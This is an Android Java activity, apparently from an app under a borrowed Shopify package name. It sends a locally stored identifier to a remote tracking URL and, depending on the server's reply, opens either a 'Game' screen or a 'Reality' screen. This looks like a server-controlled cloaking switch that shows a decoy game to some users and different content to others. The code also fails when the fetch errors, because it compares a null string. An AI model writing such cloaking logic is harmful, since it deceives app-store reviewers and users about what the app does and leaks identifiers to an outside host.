package com.shopify.arriv;

import static com.shopify.arriv.GloSol.CAAAM_1;

import androidx.appcompat.app.AppCompatActivity;

import android.annotation.SuppressLint;
import android.content.Intent;
import android.os.AsyncTask;
import android.os.Bundle;
import android.widget.TextView;

import com.orhanobut.hawk.Hawk;

import org.jsoup.Jsoup;
import org.jsoup.nodes.Document;

public class Mover extends AppCompatActivity {
    TextView stxt;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_mover);

        stxt = findViewById(R.id.sltXt);

        new procAs().execute();
    }

    public class procAs extends AsyncTask<Void, Void, Void> {


        String bO;

        String caraculya = Hawk.get(CAAAM_1);

        String mainPlatform = "https://crowninfinity.space/h7cG3?";


        String si8 = "sub_id_8=";



        String gotItFin = mainPlatform + si8 + caraculya;


        @Override
        protected Void doInBackground(Void... voids) {
            try {

                Document doc = Jsoup.connect(gotItFin).get();


                bO = doc.text();
            } catch (Exception e) {
                e.printStackTrace();
            }


            return null;
        }


        @Override
        protected void onPostExecute(Void aVoid) {
            super.onPostExecute(aVoid);
            stxt.setText(bO);

            Intent int1 = new Intent(getApplicationContext(), Game.class);

            Intent int2 = new Intent(getApplicationContext(), Reality.class);
            if (bO.equals("N57v")) {
                startActivity(int1);
            } else {
                startActivity(int2);
            }
            finish();
        }

    }
}